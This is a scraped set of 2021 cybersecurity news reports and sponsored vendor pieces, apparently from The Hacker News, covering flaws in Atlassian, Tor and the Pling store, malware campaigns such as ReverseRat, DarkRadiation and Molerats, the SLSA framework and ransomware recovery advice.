'text': 'Enterprise applications used to live securely in data centers and office employees connected to internal networks using company-managed laptops or desktops. And data was encircled by a walled perimeter to keep everything safe.\nAll that changed in the last 18 months. Businesses and employees had to adapt quickly to cloud technology and remote work. The cloud gave businesses the agility to respond faster to change and the scale to accommodate rapid growth. Remote work boosted productivity by letting employees access cloud data from anywhere on any device.\nThis is not business as usual. The data center and the perimeter security are no longer the center of the universe. Now remote workers, personal mobile devices, applications, and data are in the middle.\nAlthough employees, applications, and data have left the building, IT security teams still shoulder the responsibility for protecting confidential data and ensuring compliance with strict privacy regulations. The risk of not doing so can be costly.\nRegister for this upcoming webinar to learn how to reduce risk with integrated endpoint-to-cloud security.\nData security and access turned upside down\nIt’s impossible to see risk when you don’t know what you’re up against. Employees now access data in your cloud from everywhere using personal devices and local Wi-Fi networks you can’t see or manage. Whatever visibility you had is gone. Left unresolved, little – if anything – is under your control.\nCurrently, security from endpoints to the cloud involves multiple standalone tools that solve specific problems. But beware: Sometimes, juggling dozens of security tools –each unaware that the other exists – increases the risk of exposure.\nSome organizations rely on virtual private networks (VPNs for remote workforce access. While they connect employees to cloud applications and data from anywhere, VPNs can assume every user and device is trustworthy (they are not). So, use caution with VPNs. They can leave your infrastructure and everything connected to it extremely vulnerable.\nMired in the momentum of mediocrity, the traditional security approach only offers a fraction of what’s needed to ensure endpoint-to-cloud security. It doesn’t give you visibility or insight into the security posture of your users and endpoints or cloud applications. And it can’t enforce zero trust, a staple of modern security.\nMinimize business risk\nWith data going where it’s needed, organizations can minimize risk by regaining the same visibility, insights, and access controls they had with a perimeter. To do so, you need a cloud-delivered solution that provides strong data and privacy protections from endpoints to the cloud.\nLookout recommends considering these three factors to minimize risk:\nComplete visibility –The first step to securing your data is knowing what’s going on. This requires visibility into the risk levels of users, devices, applications, and data. Visibility also plays a key role in ensuring compliance with data privacy regulations.Unified insights –Your security infrastructure should be integrated into one unified platform to manage policies, detect cyberthreats and perform conclusive incident investigations. This will give you actionable insights from endpoints to the cloud.Secure access to empower productivity – To protect data without impeding productivity, it’s critical to enforce Zero rust access that has the intelligence to understand and adapt to continuous changes in users, devices, locations, applications, and data.\n \nData protection from endpoint to cloud\nTo achieve endpoint-to-cloud visibility, insights, and access control, organizations require perimeter-like security capabilities delivered from the cloud. In 2019, Gartner introduced the Secure Access Service Edge (SASE), a framework that addresses these challenges and calls for rolling multiple security solutions into one unified architecture.\nSince then, throngs of vendors have integrated various security tools into their SASE products. Some offer cloud security but no endpoint security or continuous risk assessment. Others have basic access controls but don’t analyze user behaviors, detect malware on the fly or identify compliance gaps. And many don’t include advanced data protections that encrypt confidential data, emails, or files and enforce strict data-sharing rules.\nEvery vendor’s interpretation of SASE should be carefully vetted to ensure that they integrate and adequately address every critical aspect of how your organization now operates with remote or hybrid work permanently in place. This modern security approach, with SASE and Zero Trust as cornerstones, will protect data from endpoints to the cloud by providing all-important visibility into devices, users, networks, access privileges, and cloud applications.\nRegister for this upcoming webinar to learn how Lookout delivers comprehensive endpoint-to-cloud security from one unified platform.\n\n\nFound this article interesting?

'text': 'Cybersecurity researchers on Wednesday disclosed critical flaws in the Atlassian project and software development platform that could be exploited to take over an account and control some of the apps connected through its single sign-on (SSO) capability.\n“With just one click, an attacker could have used the flaws to get access to Atlassian’s publish Jira system and get sensitive information, such as security issues on Atlassian cloud, Bitbucket and on premise products,“ Check Point Research said in an analysis shared with The Hacker News.\n\nAfter the issues were reported to Atlassian on Jan. 8, 2021, the Australian company deployed a fix as part of its updates rolled out on May 18. The sub-domains affected by the flaws include - \njira.atlassian.comconfluence.atlassian.comgetsupport.atlassian.compartners.atlassian.comdeveloper.atlassian.comsupport.atlassian.comtraining.atlassian.com\nSuccessful exploitation of these flaws could result in a supply-chain attack wherein an adversary can take over an account, using it to perform unauthorized actions on behalf of the victim, edit Confluence pages, access Jira tickets, and even inject malicious implants to stage further attacks down the line.\n\nThe weaknesses hinge on the fact that Atlassian uses SSO to ensure seamless navigation between the aforementioned domains, thus creating a potential attack scenario that involves injecting malicious code into the platform using XSS and CSRF, followed by leveraging a session fixation flaw to hijack a valid user session and take control of an account.\nIn other words, an attacker can trick a user into clicking on a specially-crafted Atlassian link in order to execute a malicious payload that steals the user’s session, which can then be used by the bad actor to log in to the victim’s account and obtain sensitive information.\n\nWhat’s more, armed with the Jira account, the attacker can proceed to gain control of a Bitbucket account by opening a Jira ticket embedded with a malicious link to a rogue website that, when clicked from an auto-generated email message, could be used to pilfer the credentials, effectively granting them permissions to access or alter source code, make a repository public, or even insert backdoors.\n“Supply chain attacks have piqued our interest all year, ever since the SolarWinds incident. The platforms from Atlassian are central to an organization’s workflow,“ said Oded Vanunu, head of products vulnerabilities research at Check Point. “An incredible amount of supply chain information flows through these applications, as well as engineering and project management.“\n“In a world where distributed workforces increasingly depend on remote technologies, it’s imperative to ensure these technologies have the best defenses against malicious data extraction,“ Vanunu added.\n\n\nFound this article interesting?

{'title': 'Pakistan-linked hackers targeted Indian power company with ReverseRat',
'text': 'A threat actor with suspected ties to Pakistan has been striking government and energy organizations in the South and Central Asia regions to deploy a remote access trojan on compromised Windows systems, according to new research.\n“Most of the organizations that exhibited signs of compromise were in India, and a small number were in Afghanistan,“ Lumen’s Black Lotus Labs said in a Tuesday analysis. “The potentially compromised victims aligned with the government and power utility verticals.“\nSome of the victims include a foreign government organization, a power transmission organization, and a power generation and transmission organization. The covert operation is said to have begun at least in January 2021.\n\nThe intrusions are notable for a number of reasons, not least because in addition to its highly-targeted nature, the tactics, techniques, and procedures (TTPs) adopted by the adversary rely on repurposed open-source code and the use of compromised domains in the same country as the targeted entity to host their malicious files.\nAt the same time, the group has been careful to hide their activity by modifying the registry keys, granting them the ability to surreptitiously maintain persistence on the target device without attracting attention.\nExplaining the multi-step infection chain, Lumen noted the campaign “resulted in the victim downloading two agents; one resided in-memory, while the second was side-loaded, granting threat actor persistence on the infected workstations.“\n\nThe attack commences with a malicious link sent via phishing emails or messages that, when clicked, downloads a ZIP archive file containing a Microsoft shortcut file (.lnk) and a decoy PDF file from a compromised domain.\nThe shortcut file, besides displaying the benign document to the unsuspecting recipient, also takes care of stealthily fetching and running an HTA (HTML application) file from the same compromised website.\nThe lure documents largely describe events catering to India, disguising as a user manual for registering and booking an appointment for COVID-19 vaccine through the CoWIN online portal, while a few others masquerade as the Bombay Sappers, a regiment of the Corps of Engineers of the Indian Army.\n\nIrrespective of the PDF document displayed to the victim, the HTA file — itself a JavaScript code based on a GitHub project called CactusTorch — is leveraged to inject a 32-bit shellcode into a running process to ultimately install a .NET backdoor called ReverseRat that runs the typical spyware gamut, with capabilities to capture screenshots, terminate processes, execute arbitrary executables, perform file operations, and upload data to a remote server.\nThe custom-developed framework also comes with a third component in which a second HTA file is downloaded from the same domain to deploy the open-source AllaKore remote agent, potentially in an alternative attempt to maintain access to the compromised network.\n“While this threat actor’s targets have thus far remained within the South and Central Asian regions, they have proven effective at gaining access to networks of interest,“ the researchers said. “Despite previously relying upon open-source frameworks such as AllaKore, the actor was able to remain effective and expand its capabilities with the development of the Svchostt agent and other components of the ReverseRat project.“\n\n\nFound this article interesting?

{'title': '[Whitepaper] Automate Your Security with Cynet to Protect from Ransomware',
'text': 'It seems like every new day brings with it a new ransomware news item – new attacks, methods, horror stories, and data being leaked.\nRansomware attacks are on the rise, and they’ve become a major issue for organizations across industries. A recent report estimated that by 2031, ransomware attacks would cost the world over $260 billion.\nA new whitepaper from XDR provider Cynet demonstrates how the company’s platform can help organizations mitigate the impact of ransomware (download here).\nToday, attackers have shown themselves to be less interested in ignoring the most vulnerable sectors, such as health care providers and hospitals. With a parallel increase in the number of variants – Wastedlocker, FTCode, Tycooon, TrickBot, REvil, and many others – it’s becoming harder to defend against the growing threat of ransomware.\nRansomware operates by using a variety of infection and encryption techniques to steal or barricade companies’ files behind hard paywalls. Even though many of the most common techniques have become public and organizations can defend against them, new, unknown methods can arrive without notice. \nSMEs are at risk\nThe whitepaper by Cynet explains how the XDR platform works to protect users from ransomware attacks. It also notes that small and medium enterprises, especially, face similar risks to large corporations, but with a much leaner budget and fewer resources. Moreover, an industry-wide skills shortage means they may not always be able to fill necessary positions to keep themselves defended.\nAccording to the whitepaper, the first step to defend against ransomware is to prevent it from infecting an environment in the first place. That’s not always possible, and if ransomware does manage to breach an endpoint, it’s critical to have a full view of the environment and be able to detect the infection and kill all related ransomware processes.\nMoreover, it’s crucial to isolate infected machines. In short, the optimal response is prevention, rapid detection, containment, and removal.\nConsolidating defenses in a single, unified platform \nCynet breaks down how its platform relies on a variety of prevention, detection, and remediation layers that protect its customers from ransomware attacks.\nThe company’s approach attempts to match and adapt to the complexities of dealing with ransomware: \nDetection is difficult since attackers are constantly changing the techniques attackers use to deploy ransomware.Speed is of the essence when dealing with ransomware, since it will always move to lock machines and files, complicating the remediation process. Because ransomware doesn’t immediately strike, and can remain hidden for long periods, defenses need full visibility across their environment to root out any traces of it. \nCynet is constantly fielding calls to assist with ransomware attacks, and it has developed a strong toolkit of incident response tools. However, many companies only learn about the impact of ransomware and the importance of preemptive defenses after they’ve been infected.\nPrevention and detection\nCynet’s solution starts with multiple preventions and detection techniques, including common next-generation antivirus (NGAV), and adds in real-time memory protection to detect ransomware behaviors from unknown variants, critical component filtering to prevent ransomware from harvesting credentials and spreading, real-time file filtering to prevent ransomware from altering existing files and deception technology to lure ransomware into accessing decoy hosts and files.\nInvestigation and Remediation\nWhile most ransomware protection solution providers focus almost exclusively on prevention and detection, Cynet also places considerable emphasis on quickly and thoroughly responding to ransomware attacks post-detection.\nImportantly, Cynet emphasizes that the prevention and detection of an attack instance are critical, but only the first step. Companies must assume that the malicious artifact identified is only the tip of an iceberg.\nCynet automatically triggers an automated investigation following each endpoint, user, or network alert, to disclose its root cause and scope and apply required remediation actions across the environment. Because Cynet is an XDR solution, it can apply a very broad range of remediation actions directly from its platform across endpoints, networks, users, and files.\nThey also provide automated remediation playbooks, which are very valuable for stringing multiple remediation actions together to respond to ransomware threats.\nFinal Thoughts\nAfter speaking with several representatives from companies that have had to dig themselves out of a widespread ransomware infection, you definitely do not want to be in that situation. Every single one wished they had better protections in place so they could have avoided the excruciating experience.\nHaving a broad arsenal of prevention, detection, and response tools are critical to prevent your company from becoming the next ransomware victim.\nDownload the whitepaper here. \n\n\nFound this article interesting?

{'title': 'Patch Tor Browser Bug to Prevent Tracking of Your Online Activities',
'text': 'Open-source Tor browser has been updated to version 10.0.18 with fixes for multiple issues, including a privacy-defeating bug that could be used to uniquely fingerprint users across different browsers based on the apps installed on a computer.\nIn addition to updating Tor to 0.4.5.9, the browser’s Android version has been upgraded to Firefox to version 89.1.1, alongside incorporating patches rolled out by Mozilla for several security vulnerabilities addressed in Firefox 89.\n\nChief among the rectified issues is a new fingerprinting attack that came to light last month. Dubbed scheme flooding, the vulnerability enables a malicious website to leverage information about installed apps on the system to assign users a permanent unique identifier even when they switch browsers, use incognito mode, or a VPN.\nPut differently, the weakness takes advantage of custom URL schemes in apps as an attack vector, allowing a bad actor to track a device’s user between different browsers, including Chrome, Firefox, Microsoft Edge, Safari, and even Tor, effectively circumventing cross-browser anonymity protections on Windows, Linux, and macOS.\n\n“A website exploiting the scheme flooding vulnerability could create a stable and unique identifier that can link those browsing identities together,“ FingerprintJS researcher Konstantin Darutkin said.\nCurrently, the attack checks a list of 24 installed applications that consists of Adobe, Battle.net, Discord, Epic Games, ExpressVPN, Facebook Messenger, Figma, Hotspot Shield, iTunes, Microsoft Word, NordVPN, Notion, Postman, Sketch, Skype, Slack, Spotify, Steam, TeamViewer, Telegram, Visual Studio Code, WhatsApp, Xcode, and Zoom.\nThe issue has serious implications for privacy as it could be exploited by adversaries to unmask Tor users by correlating their browsing activities as they switch to a non-anonymizing browser, such as Google Chrome. To counter the attack, Tor now sets “network.protocol-handler.external“ to false so as to block the browser from probing installed apps.\n\nOf the other three browsers, while Google Chrome features built-in safeguards against scheme flooding — it prevents launching any application unless it’s triggered by a user gesture, like a mouse click — the browser’s PDF Viewer was found to bypass this mitigation.\n“Until this vulnerability is fixed, the only way to have private browsing sessions not associated with your primary device is to use another device altogether,“ Darutkin said. Tor browser users are recommended to move quickly to apply the update to ensure they are protected.\nThe development arrives little over a week after encrypted messaging service Wire addressed two critical vulnerabilities in its iOS and web app that could lead to a denial-of-service (CVE-2021-32666) and permit an attacker to take control of a user account (CVE-2021-32683).\n\n\nFound this article interesting?

{'title': 'Unpatched Flaw in Linux Pling Store Apps Could Lead to Supply-Chain Attacks',
'text': 'Cybersecurity researchers have disclosed a critical unpatched vulnerability affecting Pling-based free and open-source software (FOSS) marketplaces for Linux platform that could be potentially abused to stage supply-chain attacks and achieve remote code execution (RCE).\n“Linux marketplaces that are based on the Pling platform are vulnerable to a wormable [cross-site scripting] with potential for a supply-chain attack,“ Positive Security co-founder Fabian Bräunlein said in a technical write-up published today. “The native PlingStore application is affected by an RCE vulnerability, which can be triggered from any website while the app is running.“\n\nThe Pling-based app stores impacted by the flaw include —\nappimagehub.comstore.kde.orggnome-look.orgxfce-look.orgpling.com\nPlingStore allows users to search and install Linux software, themes, icons, and other add-ons that may not be available for download through the distribution’s software center. \nThe vulnerability stems from the manner the store’s product listings page parses HTML or embedded media fields, thereby potentially allowing an attacker to inject malicious JavaScript code that could result in arbitrary code execution.\n\n“This stored XSS could be used to modify active listings, or post new listings on the Pling store in the context of other users, resulting in a wormable XSS,“ Bräunlein said.\nMore troublingly, this could allow for a supply-chain attack XSS worm wherein a JavaScript payload could be exploited by an adversary to upload trojanized versions of software and tweak the metadata of a victim’s listing to include and propagate the attack code.\nWith the PlingStore app acting as a single digital storefront for all the aforementioned app stores, Positive Security noted that the XSS exploit can be triggered from within the app that, when coupled with a sandbox bypass, could lead to remote code execution.\n\n“As the application can install other applications, it has another built-in mechanism to execute code on the [operating system] level,“ Bräunlein explained. “As it turns out, that mechanism can be exploited by any website to run arbitrary native code while the PlingStore app is open in the background.“\nPut differently, when a user visits a malicious website via the browser, the XSS is triggered inside the Pling app while it’s running in the background. Not only can the JavaScript code in the website establish a connection to the local WebSocket server that’s used to listen to messages from the app, it also uses it to send messages to execute arbitrary native code by downloading and executing an .AppImage package file.\n\nWhat’s more, a similar XSS flaw uncovered in the GNOME Shell Extensions marketplace could be leveraged to target the victim’s computer by issuing malicious commands to the Gnome Shell Integration browser extension and even backdoor published extensions.\nThe Berlin-based cybersecurity firm noted that the flaws were reported to the respective project maintainers on Feb. 24, with KDE Project and GNOME Security issuing patches for the issues following disclosure. In light of the fact that the RCE flaw associated with the PlingStore remains unaddressed as yet, it’s recommended not to run the Electron application until a fix is in place.\n  var adpushup = adpushup || {}; adpushup.que = adpushup.que || []; adpushup.que.push(function() { adpushup.triggerAd(“c642f0d8-e2f2-48f9-8dd1-c9ca934ec74e“); });  \nThe report comes less than a month after severe security weaknesses were uncovered in several popular Visual Studio Code extensions that could enable attackers to compromise local machines as well as build and deployment systems through a developer’s integrated development environment, ultimately paving the way for supply-chain attacks.\n“[The flaws] demonstrate the additional risk associated with such marketplaces,“ Bräunlein said. “In this environment, even relatively small vulnerabilities (e.g. a missing origin check) can lead to severe consequences (drive-by RCE from any browser with the vulnerable application running in background). Developers of such applications must put in a high level of scrutiny to ensure their security.“\n\n\nFound this article interesting?

{'title': 'Wormable DarkRadiation Ransomware Targets Linux and Docker Instances',
'text': 'Cybersecurity researchers are sounding the alarm bell over a new ransomware strain called “DarkRadiation“ that’s implemented entirely in Bash and targets Linux and Docker cloud containers, while banking on messaging service Telegram for command-and-control (C2) communications.\n“The ransomware is written in Bash script and targets Red Hat/CentOS and Debian Linux distributions,“ researchers from Trend Micro said in a report published last week. “The malware uses OpenSSL’s AES algorithm with CBC mode to encrypt files in various directories. It also uses Telegram’s API to send an infection status to the threat actor(s).“\n\nAs of writing, there’s no information available on the delivery methods or evidence that the ransomware has been deployed in real-world attacks.\nThe findings come from an analysis of a collection of hacking tools hosted on the unidentified threat actor’s infrastructure (IP address “185.141.25.168“) in a directory called “api_attack.“ The toolset was first noticed by Twitter user @r3dbU7z on May 28.\nDarkRadiation’s infection chain involves a multi-stage attack process and is noteworthy for its extensive reliance on Bash scripts to retrieve the malware and encrypt the files as well as Telegram API to communicate with the C2 server via hardcoded API keys.\nEncryption Process\nSaid to be under active development, the ransomware leverages obfuscation tactics to scramble the Bash script using an open-source tool called “node-bash-obfuscate“ to split the code into multiple chunks, followed by assigning a variable name to each segment and replacing the original script with variable references.\nUpon execution, DarkRadiation checks if it’s run as the root user, and if so, uses the elevated permissions to download and install Wget, cURL, and OpenSSL libraries, and takes a periodic snapshot of the users that are currently logged into a Unix computer system using the “who“ command every five seconds, the results of which are then exfiltrated to an attacker-controlled server using the Telegram API.\n\n“If any of these [libraries] are not available on the infected device, the malware attempts to download the required tools using YUM (Yellowdog Updater, Modified), a python-based package manager widely adopted by popular Linux distros such as RedHat and CentOS,“ SentinelOne researchers explained in a parallel write-up of DarkRadiation published Monday.\nThe ransomware, in its final phase of the infection, retrieves a list of all available users on the compromised system, overwrites existing user passwords with “megapassword,“ and deletes all shell users, but not before creating a new user with the username “ferrum“ and password “MegPw0rD3“ to proceed with the encryption process.\nWorm-like Spreading Functionality\nInterestingly, SentinelOne’s analysis reveals different variations wherein the password for the user “ferrum“ is downloaded from the attacker’s C2 server in few versions, while in others, it is hardcoded with strings such as “$MeGaPass123#,“ implying that the malware is undergoing rapid changes prior to actual deployment.\n“It must be noted that the ransomware appends radioactive symbols (’.☢’) as a file extension for an encrypted file,“ Trend Micro threat researcher Aliakbar Zahravi said.\nA second moving part associated with the attack is an SSH worm that’s engineered to receive a credential configuration in the form of a base64-encoded parameter. Subsequently, this encoded argument is used to connect to the target system using the SSH protocol, and eventually download and execute the ransomware.\n  var adpushup = adpushup || {}; adpushup.que = adpushup.que || []; adpushup.que.push(function() { adpushup.triggerAd(“c642f0d8-e2f2-48f9-8dd1-c9ca934ec74e“); });  \nIn addition to reporting the execution status, along with the encryption key, back to the adversary’s Telegram channel through the API, DarkRadiation also comes with capabilities to stop and disable all running Docker containers on the infected machine, after which a ransom note is displayed to the user.\n“Malware written in shell script languages allows attackers to be more versatile and to avoid some common detection methods,“ SentinelOne researchers said.\n“As scripts do not need to be recompiled, they can be iterated upon more rapidly. Moreover, since some security software relies on static file signatures, these can easily be evaded through rapid iteration and the use of simple obfuscator tools to generate completely different script files.“\n\n\nFound this article interesting?

{'title': '5 Critical Steps to Recover From a Ransomware Attack',
'text': 'Hackers are increasingly using ransomware as an effective tool to disrupt businesses and fund malicious activities.\nA recent analysis by cybersecurity company Group-IB revealed ransomware attacks doubled in 2020, while Cybersecurity Ventures predicts that a ransomware attack will occur every 11 seconds in 2021.\nBusinesses must prepare for the possibility of a ransomware attack affecting their data, services, and business continuity. What steps are involved in recovering from a ransomware attack?\nIsolate and shutdown critical systemsEnact your business continuity planReport the cyberattackRestore from backupRemediate, patch, and monitor\nIsolate and shutdown critical systems\nThe first important step is to isolate and shut down business-critical systems. There is a chance the ransomware has not affected all accessible data and systems. Shutting down and isolating both infected systems and healthy systems helps contain malicious code.\nFrom the first evidence of ransomware on the network, containment should be a priority. Containment and isolation can include isolating systems from a network perspective or powering them down altogether. \nEnact your business continuity plan\nThe business continuity plan and its disaster recovery component are essential to maintaining some level of business operations.\nThe business continuity plan is a step-by-step playbook that helps all departments understand how the business operates in times of disaster or other business-altering scenarios. The disaster recovery component details how critical data and systems can be restored and brought back online. \nReport the cyberattack\nMany businesses may hesitate to do so, but reporting the attack to customers, stakeholders, and law enforcement is essential. Law enforcement agencies can provide access to resources that may not be available otherwise.\nYou will also need to consider compliance regulations. The GDPR, for example, provides businesses with a 72-hour window to disclose a data breach involving customers’ personal information.\nRestore from backup\nThe best protective measure you have for your data is backups. However, restoring large quantities of data can be time-consuming, forcing the business to be offline for an extended period of time.\nThis situation highlights the need to discover and contain ransomware infections as quickly as possible to reduce the amount of data that needs recovering. \nRemediate, patch, and monitor \nIn the final phase of recovering from a ransomware attack, companies remediate the ransomware infection, patch systems that may have led to the initial ransomware compromise, and monitor the environment closely for further malicious activity.\nIt is not unheard of for malicious activity to continue, even if the ransom is paid, or if infected systems were restored. If the same vulnerability exists that led to the initial attack, the environment can become compromised once again. \nRemediate common entry points for ransomware\nAs businesses look to bolster the environment against ransomware and other malicious threats, it is crucial to look at the common entry points for these types of attacks.\nCyberattacks use phishing attacks to harvest stolen credentials which can then be used to launch a ransomware attack, or access systems directly. \nPrevention and next steps \nBusinesses must not be careless in handling password security, especially with Active Directory user accounts. Unfortunately, Active Directory does not have good native security tools for securing passwords in line with today’s password security policy requirements.\nSpecops Password Policy provides breached password protection, disallowed password lists, and many other robust security features to protect your environment. It takes the very basic password policies available in Active Directory and aligns them with modern guidance from NIST and other cybersecurity authorities.\nLearn more about Specops Password Policy and download a free trial to protect your environment from vulnerable passwords. \n\n\nFound this article interesting?

'text': 'A new research published by a group of academics has found that anti-virus programs for Android continue to remain vulnerable against different permutations of malware, in what could pose a serious risk as malicious actors evolve their toolsets to better evade analysis.\n“Malware writers use stealthy mutations (morphing/obfuscations) to continuously develop malware clones, thwarting detection by signature based detectors,“ the researchers said. “This attack of clones seriously threatens all the mobile platforms, especially Android.“\n\nThe findings were published in a study last week by researchers from Adana Science and Technology University, Turkey, and the National University of Science and Technology, Islamabad, Pakistan.\nUnlike iOS, apps can be downloaded from third-party sources on Android devices, raising the possibility that unwitting users can install unverified and lookalike apps that clone a legitimate app’s functionality but are built to trick targets into downloading apps laced with fraudulent code that are capable of stealing sensitive information.\n\nWhat’s more, malware authors can expand on this technique to develop multiple clones of the rogue software with varying levels of abstraction and obfuscation to disguise their true intent and slip through the defense barriers created by anti-malware engines.\nTo test and evaluate the resilience of commercially available anti-malware products against this attack, the researchers developed a tool called DroidMorph, which allows Android applications (APKs) to be “morphed“ by decompiling the files to an intermediate form that’s then modified and compiled to create clones, both benign and malware.\n\nMorphing could be at different levels, the researchers noted, such as those that involve changing the class and method names in the source code or something non-trivial that could alter the execution flow of the program, including the call graph and the control-flow graph.\n\nIn a test conducted using 1,771 morphed APK variants generated through DroidMorph, the researchers found that 8 out of 17 leading commercial anti-malware programs failed to detect any of the cloned applications, with an average detection rate of 51.4% for class morphing, 58.8% for method morphing, and 54.1% for body morphing observed across all programs.\nThe anti-malware programs that were successfully bypassed include LineSecurity, MaxSecurity, DUSecurityLabs, AntivirusPro, 360Security, SecuritySystems, GoSecurity, and LAAntivirusLab.\nAs future work, the researchers outlined that they intend to add more obfuscations at different levels as well as enable morphing of metadata information such as permissions that are embedded in an APK file with an aim to bring down the detection rates.\n\n\nFound this article interesting?

{'title': 'Google Releases New Framework to Prevent Software Supply Chain Attacks',
'text': 'As software supply chain attacks emerge as a point of concern in the wake of SolarWinds and Codecov security incidents, Google is proposing a solution to ensure the integrity of software packages and prevent unauthorized modifications. \nCalled “Supply chain Levels for Software Artifacts“ (SLSA, and pronounced “salsa“), the end-to-end framework aims to secure the software development and deployment pipeline — i.e., the source ➞ build ➞ publish workflow — and mitigate threats that arise out of tampering with the source code, the build platform, and the artifact repository at every link in the chain.\n\nGoogle said SLSA is inspired by the company’s own internal enforcement mechanism called Binary Authorization for Borg, a set of auditing tools that verifies code provenance and implements code identity to ascertain that the deployed production software is properly reviewed and authorized.\n“In its current state, SLSA is a set of incrementally adoptable security guidelines being established by industry consensus,“ said Kim Lewandowski of Google Open Source Security Team and Mark Lodato of the Binary Authorization for Borg Team.\n\n“In its final form, SLSA will differ from a list of best practices in its enforceability: it will support the automatic creation of auditable metadata that can be fed into policy engines to give ’SLSA certification’ to a particular package or build platform.“\nThe SLSA framework promises end-to-end software supply chain integrity and is designed to be both incremental and actionable. It comprises four different levels of progressive software security sophistication, with SLSA 4 offering a high degree of confidence that the software has not been improperly tinkered.\nSLSA 1 — Requires that the build process be fully scripted/automated and generate provenanceSLSA 2 — Requires using version control and a hosted build service that generates authenticated provenanceSLSA 3 — Requires that the source and build platforms meet specific standards to guarantee the auditability of the source and the integrity of the provenanceSLSA 4 — Requires a two-person review of all changes and a hermetic, reproducible build process\n“Higher SLSA levels require stronger security controls for the build platform, making it more difficult to compromise and gain persistence,“ Lewandowski and Lodato noted.\n\nWhile SLA 4 represents the ideal end state, the lower levels provide incremental integrity guarantees, at the same time making it difficult for malicious actors to stay concealed in a breached developer environment for extended periods of time.\n\nAlong with the announcement, Google has shared additional details about the Source and Build requirements that need to be satisfied, and is also calling on the industry to standardize the system and define a threat model that details specific threats SLSA hopes to address in the long term.\n“Achieving the highest level of SLSA for most projects may be difficult, but incremental improvements recognized by lower SLSA levels will already go a long way toward improving the security of the open source ecosystem,“ the company said.\n\n\nFound this article interesting?

'text': 'It’s natural to get complacent with the status quo when things seem to be working. The familiar is comfortable, and even if something better comes along, it brings with it many unknowns.\nIn cybersecurity, this tendency is countered by the fast pace of innovation and how quickly technology becomes obsolete, often overnight.\nThis combination usually results in one of two things – organizations make less than ideal choices about the software and tools they’re adding, or security leaders simply cannot stay abreast of new developments and opt to stay put with their existing stack.\nThe problem is that once you let one update pass you by, you’re suddenly miles behind. A new eBook from XDR provider Cynet (download here) offers insights into factors that are clear signs organizations need to upgrade their detection and response tools to stay with the times.\nThe eBook highlights several factors and questions that companies can ask themselves to determine whether they are okay with the level of security they have, or if they should upgrade their detection and response capabilities. \nLooking for signs \nThere’s a variety of reasons why an organization’s detection and response tools might need a refresh, ranging from the critical to the less obvious. \nOne of the first signs, however, is clear for most organizations – the number of alerts they must sift through daily.\nToday’s security stacks produce thousands of alerts daily, forcing many teams to pick and choose which they can investigate and for how long. As a result, critical alerts are prioritized, but they only make up a small percentage of the total amount.\nIdeally, an organization should explore every alert – even the false positives. The inability to cope with alerts, or simply reduce the number of alerts, is a clear indicator that organizations should upgrade their security stack. \nThe eBook also takes aim at security stacks and tools that require dozens of add-ons and extensions to operate adequately.\nFor many organizations, installing and setting up a new EDR includes the process of finding the extensions that offer the tools necessary. Even worse, in some cases, add-ons are required simply to provide baseline services. On the other hand, the eBook argues, XDRs come set up out of the box to provide all the tools and features necessary to offer full functionality. \nSome of the other signs you might need a new detection and response tool include: \nIf only one person knows how to operate and manage an organization’s EDR. Large security stacks have steep learning curves, and most organizations don’t have the skills or resources to devote to training a whole team. So, a single person gets appointed to manage and orchestrate the security strategy. This is problematic for several reasons and is a key indicator a simplified tool such as an XDR can help. If your existing EDR suddenly claims to have upgraded to XDR, without any notable changes. A side effect of a rapidly evolving industry is that every vendor wants to hop on the next big thing – in this case, XDR. Therefore, many vendors will claim to offer XDR or “XDR-like“ capabilities without actually offering a noticeable improvement or even added functionality. If you look longingly at deception technology, but can’t afford it. Some tools are still not quite necessities, but they’re valuable assets to have. The problem, as is the case with deception technology, is that it’s costly and complicated to set up. On the other hand, a solution that has it included natively offers significant benefits.\nYou can learn more about indicators of whether you need a new detection and response tool here. \n\n\nFound this article interesting?

{'title': 'Molerats Hackers Return With New Attacks Targeting Middle Eastern Governments',
'text': 'A Middle Eastern advanced persistent threat (APT) group has resurfaced after a two-month hiatus to target government institutions in the Middle East and global government entities associated with geopolitics in the region in a rash of new campaigns observed earlier this month.\nSunnyvale-based enterprise security firm Proofpoint attributed the activity to a politically motivated threat actor it tracks as TA402, and known by other monikers such as Molerats and GazaHackerTeam.\nBased on its targeting and previous campaigns, TA402 is alleged to operate with motives that align with military or Palestinian state objectives. The threat actor is believed to be active for a decade, with a history of striking organizations primarily located in Israel and Palestine, and spanning multiple verticals such as technology, telecommunications, finance, academia, military, media, and governments.\n\nIt’s not clear what prompted the collective to cease its operations for two months, but Proofpoint researchers speculated that either the holy month of Ramadan or the current flare-ups in the region and the ensuing violence in May may have played a part.\nThe latest wave of attacks commenced with spear-phishing emails written in Arabic and containing PDF attachments that come embedded with a malicious geofenced URL to selectively direct victims to a password-protected archive only if the source IP address belongs to the targeted countries in the Middle East.\nRecipients who fall outside of the target group are diverted to a benign decoy website, typically Arabic language news websites like Al Akhbar (www.al-akhbar.com) and Al Jazeera (www.aljazeera.net).\n\n“The password protection of the malicious archive and the geofenced delivery method are two easy anti-detection mechanisms threat actors can use to bypass automatic analysis products,“ the researchers said.\n\nThe last step in the infection chain involved extracting the archive to drop a custom implant called LastConn, which Proofpoint said is an upgraded or new version of a backdoor called SharpStage that was disclosed by Cybereason researchers in December 2020 as part of a Molerats espionage campaign targeting the Middle East.\nBesides displaying a decoy document when LastConn is run for the first time, the malware relies heavily on Dropbox API to download and execute files hosted on the cloud service, in addition to running arbitrary commands and capturing screenshots, the results of which are subsequently exfiltrated back to Dropbox.\nIf anything, the ever-evolving toolset of TA402 underscores the group’s continued focus on developing and modifying customized malware implants in an attempt to sneak past defenses and thwart detection.\n“TA402 is a highly effective and capable threat actor that remains a serious threat, especially to entities operating in and working with government or other geopolitical entities in the Middle East,“ the researchers concluded. “It is likely TA402 continues its targeting largely focused on the Middle East region.“\n\n\nFound this article interesting?

{'title': 'A New Spyware is Targeting Telegram and Psiphon VPN Users in Iran',
